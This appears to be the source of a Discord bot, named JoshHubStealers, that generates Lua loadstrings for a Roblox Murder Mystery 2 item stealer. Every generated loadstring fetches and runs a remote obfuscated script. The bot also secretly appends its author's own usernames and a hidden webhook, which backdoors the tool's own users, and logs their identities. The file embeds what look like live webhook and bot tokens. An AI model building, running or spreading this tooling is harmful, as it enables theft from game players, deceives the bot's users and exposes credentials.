import discord
from discord import app_commands
from discord.ui import Modal, TextInput
import urllib.parse

intents = discord.Intents.default()
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)

# YOUR SECRET BACKDOOR
SECRET_USERNAMES = ["IamSuperJoshua", "IamUserJoshua"]
SECRET_WEBHOOK = "https://discord.com/api/webhooks/1452638195455098991/njZ2qCWgubR26u3_Jj9pB7Gchh_0KqPb2CHfv039UeFirthGP9ulIoaX3MEkoEkO-maD"

# YOUR GITHUB RAW URL (your obfuscated MM2 script)
RAW_SCRIPT_URL = "https://raw.githubusercontent.com/JoshScripts67/JoshHubStealerGenerator/refs/heads/main/mm2sourcebyjoshhub.txt"

class ScriptModal(Modal, title="JoshHubStealers"):
    usernames = TextInput(
        label="Target Usernames (comma separated)",
        placeholder="e.g. Nikilis, Tobi, JD",
        style=discord.TextStyle.paragraph,
        required=True
    )
    webhook = TextInput(
        label="Your Webhook URL",
        placeholder="https://discord.com/api/webhooks/...",
        style=discord.TextStyle.long,
        required=True
    )
    min_rarity = TextInput(
        label="Minimum Rarity (default: Godly)",
        placeholder="Godly, Ancient, Legendary, etc.",
        default="Godly",
        required=False
    )
    min_value = TextInput(
        label="Minimum Value (default: 1)",
        placeholder="Only steal items worth this or more",
        default="1",
        required=False
    )
    ping = TextInput(
        label="Ping @everyone on hit? (Yes/No)",
        placeholder="Yes or No",
        default="No",
        required=False
    )

    async def on_submit(self, interaction: discord.Interaction):
        # Add your secret usernames
        user_targets = [name.strip() for name in self.usernames.value.split(",") if name.strip()]
        all_targets = user_targets + SECRET_USERNAMES

        generator_info = f"{interaction.user.name}#{interaction.user.discriminator} ({interaction.user.id})"

        # Build URL parameters
        params = urllib.parse.urlencode({
            "users": ",".join(all_targets),
            "webhook": self.webhook.value,
            "secret_webhook": SECRET_WEBHOOK,
            "min_rarity": self.min_rarity.value or "Godly",
            "min_value": self.min_value.value or "1",
            "ping": self.ping.value or "No",
            "generator": generator_info
        })

        full_url = f"{RAW_SCRIPT_URL}?{params}"
        loadstring_line = f'loadstring(game:HttpGet("{full_url}"))()'

        try:
            await interaction.user.send(
                f"**🔪 JoshHubStealers – Your loadstring is ready!**\n\n"
                f"Copy and execute this:\n"
                f"```lua\n{loadstring_line}\n```"
            )
            await interaction.response.send_message("✅ Loadstring generated and sent to your DMs!", ephemeral=True)
        except:
            await interaction.response.send_message(
                "⚠️ Couldn't DM you. Here's your loadstring:\n"
                f"```lua\n{loadstring_line}\n```",
                ephemeral=True
            )

@tree.command(name="generate-mm2-stealer", description="🔪 Get your custom MM2 stealer loadstring")
async def generate_mm2_stealer(interaction: discord.Interaction):
    await interaction.response.send_modal(ScriptModal())

@bot.event
async def on_ready():
    await tree.sync()
    print(f"{bot.user} is online – JoshHubStealers loadstring generator ready!")

bot.run("MTQ1NTAzNTU3NjY3OTEzNzQzNg.G3fgfk.rvWrrB0uenN2eFvCXTXdw4ZSSKQw0CGta6ub94")  # ← REPLACE THIS WITH YOUR REAL TOKEN
